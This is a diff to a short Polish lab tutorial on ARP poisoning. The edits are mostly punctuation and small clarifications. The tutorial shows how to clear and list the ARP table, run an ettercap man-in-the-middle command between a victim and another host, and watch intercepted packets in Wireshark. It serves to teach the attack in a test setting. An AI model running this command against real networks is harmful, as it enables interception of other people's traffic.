@@ -1,11 +1,11 @@
 # ARP Poissoning
 
-### Na początku usuwamy adresy z tablicy ARP
+### Na początku usuwamy adresy z tablicy ARP:
 ```
 arp -d <ip>
 ```
 
-### Wyświetlamy tablicę ARP
+### Wyświetlamy tablicę ARP:
 ```
 arp -a
 ```
@@ -16,10 +16,10 @@ arp -a
 
 ### Jeżeli maszyna C (firewall) jest stosowana podczas testów to maszyna C będzie w stanie podsłuchiwać ruch sieciowy.
 
-### Teraz uruchamiamy ettercap
+### Teraz uruchamiamy ettercap na maszynie C:
 ```
 ettercap -Tq -M arp /ip ofiary// /ip atakującego//
 ```
 
-### Po uruchomieniu ataku, za pomocą Wiresharka możemy zauważyć podwojoną ilość wysyłanych pakietów podczas pingowania ponieważ część pakietów trafia do podsłuchu.
+### Po uruchomieniu ataku, za pomocą Wiresharka możemy zauważyć podwojoną ilość wysyłanych pakietów podczas pingowania ponieważ część pakietów trafia do podsłuchu. Do tablic arp został dopisany adres maszyny C.
 
